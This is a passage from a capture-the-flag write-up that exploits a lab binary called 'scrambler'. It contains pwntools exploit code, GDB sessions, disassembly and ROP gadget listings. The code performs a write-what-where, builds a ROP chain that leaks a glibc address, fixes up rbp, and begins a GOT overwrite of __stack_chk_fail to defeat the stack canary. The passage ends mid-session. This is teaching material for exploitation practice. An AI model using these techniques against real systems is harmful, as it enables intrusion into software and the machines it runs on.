+<span class=mtk1>elf</span> <span class=mtk5>=</span> <span class="mtk8 mtku">ELF</span><span class=mtk1>(</span><span class=mtk4>'scrambler_patched'</span><span class=mtk1>)</span>
+<span class=mtk1>glibc</span> <span class=mtk5>=</span> <span class="mtk8 mtku">ELF</span><span class=mtk1>(</span><span class=mtk4>'libc.so_1.6'</span><span class=mtk1>,</span> <span class="mtk9 mtki">checksec</span><span class=mtk5>=</span><span class=mtk6>False</span><span class=mtk1>)</span>
+
+<span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span> <span class=mtk5>=</span> <span class=mtk1>elf</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>get_process</span><span class=mtk1>():</span>
+    <span class=mtk5>if</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>)</span> <span class=mtk5>==</span> <span class=mtk6>1</span><span class=mtk1>:</span>
+        <span class=mtk5>return</span> <span class=mtk1>elf</span><span class=mtk1>.</span><span class=mtk8>process</span><span class=mtk1>()</span>
+
+    <span class=mtk1>host</span><span class=mtk1>,</span> <span class=mtk1>port</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>]</span>
+    <span class=mtk5>return</span> <span class="mtk8 mtku">remote</span><span class=mtk1>(</span><span class=mtk1>host</span><span class=mtk1>,</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk1>port</span><span class=mtk1>))</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>write_what_where</span><span class=mtk1>(</span><span class="mtk9 mtki">p</span><span class=mtk1>,</span> <span class="mtk9 mtki">what</span><span class=mtk1>:</span> <span class="mtk8 mtku">int</span><span class=mtk1>,</span> <span class="mtk9 mtki">where</span><span class=mtk1>:</span> <span class="mtk8 mtku">int</span><span class=mtk1>):</span>
+    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'&gt;</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'1'</span><span class=mtk1>)</span>
+    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'arg1</span> <span class=mtk4>=</span> <span class=mtk6>\n</span><span class=mtk4>&gt;</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'1'</span><span class=mtk1>)</span>
+    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'arg2</span> <span class=mtk4>=</span> <span class=mtk6>\n</span><span class=mtk4>&gt;</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk8 mtku">str</span><span class=mtk1>(</span><span class="mtk9 mtki">where</span><span class=mtk1>).</span><span class=mtk8>encode</span><span class=mtk1>())</span>  
+    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'arg3</span> <span class=mtk4>=</span> <span class=mtk6>\n</span><span class=mtk4>&gt;</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk8 mtku">str</span><span class=mtk1>(</span><span class="mtk9 mtki">what</span><span class=mtk1>).</span><span class=mtk8>encode</span><span class=mtk1>())</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
+    <span class=mtk1>p</span> <span class=mtk5>=</span> <span class=mtk8>get_process</span><span class=mtk1>()</span>
+
+    <span class=mtk8>write_what_where</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>,</span> <span class="mtk7 mtki">0x</span><span class=mtk6>80</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span>
+
+    <span class=mtk1>flag</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'/home/ctf/flag.txt'</span>
+
+    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>interactive</span><span class=mtk1>()</span>
+
+
+<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
+    <span class=mtk8>main</span><span class=mtk1>()</span>
+</code></pre></div><p>With this code, we have unlimited attempts to &ldquo;scramble&rdquo;. The function <code>write_what_where</code> implements the above explanation of the primitive.</p><p>Now we need to figure out if we can modify the saved return address so that we control program execution when we exit the <code>while</code> loop (using the option <code>2</code>).</p><p>One way of doing it is knowing that we are writing using <code>$rbp - 0x20</code> as base address. Since it is a 64-bit binary, experience will tell us that the saved return address is in <code>$rbp + 8</code>, so we need to use <code>0x28</code> as offset to modify the return address.</p><p>If not having enough experience, we can use GDB to find the offset. These are the lines executed when using option <code>2</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>40152a:       48 8d 3d 18 0b 00 00    lea    rdi,[rip+0xb18]        # 402049 &lt;rand@plt+0xec9&gt;  
+401531:       e8 ca fb ff ff          call   401100 &lt;puts@plt&gt;
+401536:       90                      nop
+401537:       b8 00 00 00 00          mov    eax,0x0
+40153c:       48 8b 4d e8             mov    rcx,QWORD PTR [rbp-0x18]
+401540:       64 48 33 0c 25 28 00    xor    rcx,QWORD PTR fs:0x28
+401547:       00 00
+401549:       74 05                   je     401550 &lt;rand@plt+0x3d0&gt;
+40154b:       e8 d0 fb ff ff          call   401120 &lt;__stack_chk_fail@plt&gt;
+401550:       48 83 c4 48             add    rsp,0x48
+401554:       5b                      pop    rbx
+401555:       5d                      pop    rbp
+401556:       c3                      ret
+</code></pre></div><p>We can set a breakpoint at <code>0x401555</code> (right before <code>pop rbp</code> is executed) to check the return address and <code>$rbp</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q <span class=mtku>scrambler_patched</span>
+Reading symbols from <span class=code-dark-green>scrambler_patched</span>...
+(No debugging symbols found in <span class=code-dark-green>scrambler_patched</span>)  
+<span class=code-red>gef➤</span>  break *0x401555
+Breakpoint 1 at 0x401555
+<span class=code-red>gef➤</span>  run
+Starting program: ./scrambler_patched
+1) Try scrambling
+2) Quit
+&gt; 2
+Good bye!
+
+Breakpoint 1, <span class=code-dark-blue>0x0000000000401555</span> in <span class=code-dark-yellow>??</span> ()
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  p/x $rbp
+$1 = 0x7fffffffe730
+<span class=code-green>gef➤</span>  x/10gx $rsp
+<span class=code-dark-blue>0x7fffffffe730</span>: 0x0000000000000000      0x00007ffff7dc40b3  
+<span class=code-dark-blue>0x7fffffffe740</span>: 0x00007ffff7ffc620      0x00007fffffffe828
+<span class=code-dark-blue>0x7fffffffe750</span>: 0x0000000100000000      0x00000000004013c2
+<span class=code-dark-blue>0x7fffffffe760</span>: 0x0000000000401560      0x2f62a629e826bd42
+<span class=code-dark-blue>0x7fffffffe770</span>: 0x0000000000401190      0x00007fffffffe820
+</code></pre></div><p>So the return address is <code>0x00007ffff7dc40b3</code> (from <code>__libc_start_main</code>), which is at <code>0x7fffffffe738</code> (<code>$rbp + 8</code>, as expected).</p><p>Notice that <code>$rbp</code> will be set to <code>0</code>. This will be a problem and it took me a lot of time to find a solution.</p><p>Let&rsquo;s continue for the moment. Now we know where to write so that we modify the return address, so we can start creating a simple ROP chain to leak an address inside Glibc.</p><p>I won&rsquo;t be explaining the concepts behind this technique. If you need more information, read other challenges such as <a href=../../htb-challenges/pwn/ropme>ropme</a> or <a href=../../picoctf/binary-exploitation/heres-a-libc>Here&rsquo;s a LIBC</a> for a detailed explanation. The main idea is to call <code>puts</code> using the PLT using the address of <code>puts</code> at the GOT as first argument (which will go in <code>$rdi</code>), so that <code>puts</code> prints the contents of that GOT address, which will be the real address of <code>puts</code> inside Glibc at runtime.</p><p>We can get the gadget <code>pop rdi; ret</code> with <code>ROPgadget</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ROPgadget</span> --binary <span class=mtku>scrambler</span> | <span class=code-dark-green>grep</span> <span class=code-dark-yellow>': pop rdi ; ret$'</span>  
+0x00000000004015c3 <span class=code-red>: pop rdi ; ret</span>
+</code></pre></div><p>Nice, so this is the <code>main</code> function of the exploit:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
+    <span class=mtk1>p</span> <span class=mtk5>=</span> <span class=mtk8>get_process</span><span class=mtk1>()</span>
+
+    <span class=mtk1>pop_rdi_ret</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>4015c3</span>
+    <span class=mtk1>while_addr</span>  <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>401400</span>
+
+    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>elf</span><span class=mtk1>.</span><span class=mtk1>got</span><span class=mtk1>.puts)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>elf</span><span class=mtk1>.</span><span class=mtk1>plt</span><span class=mtk1>.puts)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>while_addr</span><span class=mtk1>)</span>
+
+    <span class=mtk8>write_what_where</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>,</span> <span class="mtk7 mtki">0x</span><span class=mtk6>80</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span>
+
+    <span class=mtk5>for</span> <span class=mtk1>i</span><span class=mtk1>,</span> <span class=mtk1>b</span> <span class=mtk5>in</span> <span class="mtk8 mtku">enumerate</span><span class=mtk1>(</span><span class=mtk1>payload</span><span class=mtk1>):</span>
+        <span class=mtk8>write_what_where</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>,</span> <span class=mtk1>b</span><span class=mtk1>,</span> <span class="mtk7 mtki">0x</span><span class=mtk6>20</span> <span class=mtk5>+</span> <span class=mtk6>8</span> <span class=mtk5>+</span> <span class=mtk1>i</span><span class=mtk1>)</span>
+
+    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'&gt;</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'2'</span><span class=mtk1>)</span>
+    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>()</span>
+    <span class=mtk1>puts_addr</span> <span class=mtk5>=</span> <span class=mtk1>u64(</span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>().</span><span class=mtk8>strip</span><span class=mtk1>().</span><span class=mtk8>ljust</span><span class=mtk1>(</span><span class=mtk6>8</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span><span class=mtk1>))</span>  
+
+    <span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>info</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Leaked</span> <span class=mtk4>puts()</span> <span class=mtk4>address:</span> <span class=mtk6>{</span><span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>puts_addr</span><span class=mtk1>)</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>
+
+    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>interactive</span><span class=mtk1>()</span>
+</code></pre></div><p>And if we run the exploit, we get the leaked address:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span>
+[<span class=code-blue>*</span>] './scrambler_patched'
+    Arch:     amd64-64-little
+    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
+    Stack:    <span class=code-dark-green>Canary found</span>
+    NX:       <span class=code-dark-green>NX enabled</span>
+    PIE:      <span class=code-dark-red>No PIE (0x3ff000)</span>
+    RUNPATH:  <span class=code-dark-red>b'.'</span>
+[<span class=code-green>+</span>] Starting local process './scrambler_patched': pid 350738  
+[<span class=code-blue>*</span>] Leaked puts() address: 0x7f80e640d450
+[<span class=code-blue>*</span>] Switching to interactive mode
+1) Try scrambling
+2) Quit
+[<span class=code-blue>*</span>] Got EOF while reading in interactive
+<span class=code-red>$</span>
+</code></pre></div><p>Also notice that we used <code>0x401400</code> as the next address to return, which is the start of the <code>while</code> loop. We can&rsquo;t call the <code>main</code> function again because <code>seccomp</code> rules are already applied, and there is some setup for <code>setvbuf</code>, which is not allowed.</p><p>Let&rsquo;s compute the base address of Glibc:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>address</span> <span class=mtk5>=</span> <span class=mtk1>puts_addr</span> <span class=mtk5>-</span> <span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>sym</span><span class=mtk1>.puts</span>
+    <span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>info</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Glibc</span> <span class=mtk4>base</span> <span class=mtk4>address:</span> <span class=mtk6>{</span><span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>address</span><span class=mtk1>)</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>  
+</code></pre></div><p>Now we have the base address, which looks correct because it ends in <code>000</code> in hexadecimal:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span>
+[<span class=code-blue>*</span>] './scrambler_patched'
+    Arch:     amd64-64-little
+    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
+    Stack:    <span class=code-dark-green>Canary found</span>
+    NX:       <span class=code-dark-green>NX enabled</span>
+    PIE:      <span class=code-dark-red>No PIE (0x3ff000)</span>
+    RUNPATH:  <span class=code-dark-red>b'.'</span>
+[<span class=code-green>+</span>] Starting local process './scrambler_patched': pid 353240  
+[<span class=code-blue>*</span>] Leaked puts() address: 0x7f4119ab8450
+[<span class=code-blue>*</span>] Glibc base address: 0x7f4119a34000
+[<span class=code-blue>*</span>] Switching to interactive mode
+1) Try scrambling
+2) Quit
+[<span class=code-blue>*</span>] Got EOF while reading in interactive
+<span class=code-red>$</span>
+</code></pre></div><p>Perfect. But we have a problem. We got &ldquo;EOF while reading in interactive&rdquo;, so the program crashed. And this is all because <code>$rbp</code> is set to <code>0</code> when returning from <code>main</code>. And since we cannot call <code>main</code> from the start, we cannot set again <code>$rbp</code> to its initial value.</p><p>When I did the challenge I did not take this into account and started thinking on the next ROP chain to execute so that we can read the flag. But then I realized that I needed to solve the <code>$rbp</code> problem first.</p><p>We need to do something with <code>$rbp</code>, and we only have the binary (since Glibc is not leaked when crafting the first ROP chain). The aim is to redirect program execution to the <code>while</code> loop, but with a valid <code>$rbp</code> value (and not <code>0</code>). The only thing we can do is search for gadgets that involve <code>$rbp</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ROPgadget</span> --binary <span class=mtku>scrambler</span> | <span class=code-dark-green>grep</span> ret$ | <span class=code-dark-green>grep</span> rbp
+0x000000000040125a : add byte ptr [rax], al ; add dword ptr [<span class=code-red>rbp</span> - 0x3d], ebx ; nop ; ret
+0x000000000040125b : add byte ptr [rcx], al ; pop <span class=code-red>rbp</span> ; ret
+0x0000000000401259 : add byte ptr cs:[rax], al ; add dword ptr [<span class=code-red>rbp</span> - 0x3d], ebx ; nop ; ret
+0x000000000040125c : add dword ptr [<span class=code-red>rbp</span> - 0x3d], ebx ; nop ; ret
+0x0000000000401257 : add eax, 0x2e4b ; add dword ptr [<span class=code-red>rbp</span> - 0x3d], ebx ; nop ; ret
+0x00000000004013b8 : add eax, edx ; mov dword ptr [<span class=code-red>rbp</span> - 4], eax ; mov eax, dword ptr [<span class=code-red>rbp</span> - 4] ; leave ; ret  
+0x0000000000401551 : add esp, 0x48 ; pop rbx ; pop <span class=code-red>rbp</span> ; ret
+0x0000000000401550 : add rsp, 0x48 ; pop rbx ; pop <span class=code-red>rbp</span> ; ret
+0x00000000004013bc : cld ; mov eax, dword ptr [<span class=code-red>rbp</span> - 4] ; leave ; ret
+0x0000000000401256 : mov byte ptr [rip + 0x2e4b], 1 ; pop <span class=code-red>rbp</span> ; ret
+0x00000000004013ba : mov dword ptr [<span class=code-red>rbp</span> - 4], eax ; mov eax, dword ptr [<span class=code-red>rbp</span> - 4] ; leave ; ret
+0x00000000004013bd : mov eax, dword ptr [<span class=code-red>rbp</span> - 4] ; leave ; ret
+0x00000000004012d8 : nop ; pop <span class=code-red>rbp</span> ; ret
+0x00000000004015bb : pop <span class=code-red>rbp</span> ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004015bf : pop <span class=code-red>rbp</span> ; pop r14 ; pop r15 ; ret
+0x000000000040125d : pop <span class=code-red>rbp</span> ; ret
+0x0000000000401554 : pop rbx ; pop <span class=code-red>rbp</span> ; ret
+</code></pre></div><p>There is one gadget we can use to control <code>$rbp</code>, and it is <code>pop rbp; ret</code>. It would be great if we had a stack address to put it in <code>$rbp</code>, but we can&rsquo;t leak any stack addresses on the first ROP chain and use them to control <code>$rbp</code>.</p><p>Therefore, I tried using an address within the binary:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  vmmap
+[ Legend:  <span class=code-dark-red>Code</span> | <span class=code-dark-green>Heap</span> | <span class=code-dark-magenta>Stack</span> ]
+<span class=code-dark-blue>Start              End                Offset             Perm Path</span>
+0x000000003ff000 0x00000000400000 0x00000000000000 rw- ./scrambler_patched
+0x00000000400000 0x00000000401000 0x00000000001000 r-- ./scrambler_patched
+<span class=code-dark-red>0x00000000401000 0x00000000402000 0x00000000002000 r-x ./scrambler_patched</span>
+0x00000000402000 0x00000000403000 0x00000000003000 r-- ./scrambler_patched
+0x00000000403000 0x00000000404000 0x00000000003000 r-- ./scrambler_patched
+0x00000000404000 0x00000000405000 0x00000000004000 rw- ./scrambler_patched
+0x007ffff7d9d000 0x007ffff7da0000 0x00000000000000 rw-
+0x007ffff7da0000 0x007ffff7dc2000 0x00000000000000 r-- ./libc.so_1.6
+<span class=code-dark-red>0x007ffff7dc2000 0x007ffff7f3a000 0x00000000022000 r-x ./libc.so_1.6</span>
+0x007ffff7f3a000 0x007ffff7f88000 0x0000000019a000 r-- ./libc.so_1.6
+0x007ffff7f88000 0x007ffff7f8c000 0x000000001e7000 r-- ./libc.so_1.6
+0x007ffff7f8c000 0x007ffff7f8e000 0x000000001eb000 rw- ./libc.so_1.6
+0x007ffff7f8e000 0x007ffff7f92000 0x00000000000000 rw-
+0x007ffff7f92000 0x007ffff7f94000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1  
+<span class=code-dark-red>0x007ffff7f94000 0x007ffff7fa3000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1</span>
+0x007ffff7fa3000 0x007ffff7fb1000 0x00000000011000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
+0x007ffff7fb1000 0x007ffff7fb2000 0x0000000001f000 --- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
+0x007ffff7fb2000 0x007ffff7fb3000 0x0000000001f000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
+0x007ffff7fb3000 0x007ffff7fb4000 0x00000000020000 rw- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
+0x007ffff7fb4000 0x007ffff7fb6000 0x00000000000000 rw-
+0x007ffff7fc9000 0x007ffff7fcd000 0x00000000000000 r-- [vvar]
+<span class=code-dark-red>0x007ffff7fcd000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]</span>
+0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- ./ld-2.31.so
+<span class=code-dark-red>0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x ./ld-2.31.so</span>
+0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- ./ld-2.31.so
+0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- ./ld-2.31.so
+0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- ./ld-2.31.so
+0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-
+<span class=code-dark-magenta>0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]</span>
+0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]
+</code></pre></div><p>We need an address that has <code>rw-</code> permissions, so <code>0x404000</code> is a good choice. Since the binary has no PIE protection, this address is fix. Nevertheless, I used <code>0x404200</code> because the GOT is placed in <code>0x404000</code>, and I don&rsquo;t want to break it.</p><p>So we must update the ROP chain:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk1>pop_rdi_ret</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>4015c3</span>
+    <span class=mtk1>pop_rbp_ret</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>40125d</span>
+    <span class=mtk1>new_rbp</span>     <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>404200</span>
+    <span class=mtk1>while_addr</span>  <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>401400</span>
+
+    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>)</span>  
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>elf</span><span class=mtk1>.</span><span class=mtk1>got</span><span class=mtk1>.puts)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>elf</span><span class=mtk1>.</span><span class=mtk1>plt</span><span class=mtk1>.puts)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rbp_ret</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>new_rbp</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>while_addr</span><span class=mtk1>)</span>
+</code></pre></div><p>Notice the <code>pop_rdi_ret + 1</code> (a <code>ret</code> gadget) is needed to avoid stack alignment issues in <code>printf</code>. We have an interactive process:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span>
+[<span class=code-blue>*</span>] './scrambler_patched'
+    Arch:     amd64-64-little
+    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
+    Stack:    <span class=code-dark-green>Canary found</span>
+    NX:       <span class=code-dark-green>NX enabled</span>
+    PIE:      <span class=code-dark-red>No PIE (0x3ff000)</span>
+    RUNPATH:  <span class=code-dark-red>b'.'</span>
+[<span class=code-green>+</span>] Starting local process './scrambler_patched': pid 363454  
+[<span class=code-blue>*</span>] Leaked puts() address: 0x7f5d037c6450
+[<span class=code-blue>*</span>] Glibc base address: 0x7f5d03742000
+[<span class=code-blue>*</span>] Switching to interactive mode
+1) Try scrambling
+2) Quit
+&gt; <span class=code-red>$</span> 1
+arg1 =
+&gt; <span class=code-red>$</span> 1
+arg2 =
+&gt; <span class=code-red>$</span> 1
+arg3 =
+&gt; <span class=code-red>$</span> 1
+1) Try scrambling
+2) Quit
+&gt; <span class=code-red>$</span> 2
+Good bye!
+[<span class=code-blue>*</span>] Got EOF while reading in interactive
+</code></pre></div><p>However, we have another problem, related with the canary protection:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>40153c:       48 8b 4d e8             mov    rcx,QWORD PTR [rbp-0x18]
+401540:       64 48 33 0c 25 28 00    xor    rcx,QWORD PTR fs:0x28
+401547:       00 00
+401549:       74 05                   je     401550 &lt;rand@plt+0x3d0&gt;
+40154b:       e8 d0 fb ff ff          call   401120 &lt;__stack_chk_fail@plt&gt;  
+401550:       48 83 c4 48             add    rsp,0x48
+401554:       5b                      pop    rbx
+401555:       5d                      pop    rbp
+401556:       c3                      ret
+401557:       66 0f 1f 84 00 00 00    nop    WORD PTR [rax+rax*1+0x0]
+</code></pre></div><p>The program is taking the saved canary using and offset to <code>$rbp</code>. Since we modified <code>$rbp</code>, obviously the value at the offset won&rsquo;t be equal to the master canary (<code>fs:0x28</code>). And therefore, the program will exit immediately (<code>__stack_chk_fail</code>).</p><p>This problem comes when using option <code>2</code> to execute the second ROP chain (that will print out the flag). Since we have a &ldquo;write-what-where&rdquo; and <code>$rbp</code> has an address within the binary, we can calculate an offset to the GOT (notice there is Partial RELRO, which allows to modify the GOT at runtime).</p><p>The GOT is a table that holds the real addresses of external functions or pointers to a resolution table if the function has not been used. The objective is to modify the value of the entry for <code>__stack_chk_fail</code>, so that even if the saved canary does not match with the master canary, the program won&rsquo;t exit because <code>__stack_chk_fail</code> will not be resolved to the real <code>__stack_chk_fail</code>.</p><p>We can visualize the GOT in GDB:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q <span class=mtku>scrambler_patched</span>
+Reading symbols from <span class=code-dark-green>scrambler_patched</span>...
+(No debugging symbols found in <span class=code-dark-green>scrambler_patched</span>)  
+<span class=code-red>gef➤</span>  start
+<span class=code-blue>[+]</span> Breaking at entry-point: 0x401190
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  got
+
+GOT protection: Partial RelRO | GOT functions: 11
+
+[0x404018] <span class=code-dark-yellow>seccomp_init  →  0x401030</span>
+[0x404020] <span class=code-dark-yellow>seccomp_rule_add  →  0x401040</span>
+[0x404028] <span class=code-dark-yellow>puts@GLIBC_2.2.5  →  0x401050</span>
+[0x404030] <span class=code-dark-yellow>seccomp_load  →  0x401060</span>
+[0x404038] <span class=code-dark-yellow>__stack_chk_fail@GLIBC_2.4  →  0x401070</span>  
+[0x404040] <span class=code-dark-yellow>printf@GLIBC_2.2.5  →  0x401080</span>
+[0x404048] <span class=code-dark-yellow>srand@GLIBC_2.2.5  →  0x401090</span>
+[0x404050] <span class=code-dark-yellow>time@GLIBC_2.2.5  →  0x4010a0</span>
+[0x404058] <span class=code-dark-yellow>setvbuf@GLIBC_2.2.5  →  0x4010b0</span>
+[0x404060] <span class=code-dark-yellow>__isoc99_scanf@GLIBC_2.7  →  0x4010c0</span>
+[0x404068] <span class=code-dark-yellow>rand@GLIBC_2.2.5  →  0x4010d0</span>
+</code></pre></div><p>The above values are the GOT entries when the program starts. None of them is resolved because they have not been called yet. Let&rsquo;s set a breakpoint before closing the program and check again the GOT:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  break *0x401555
+Breakpoint 1 at <span class=code-dark-blue>0x401555</span>
+<span class=code-green>gef➤</span>  run
+Starting program: ./scrambler_patched
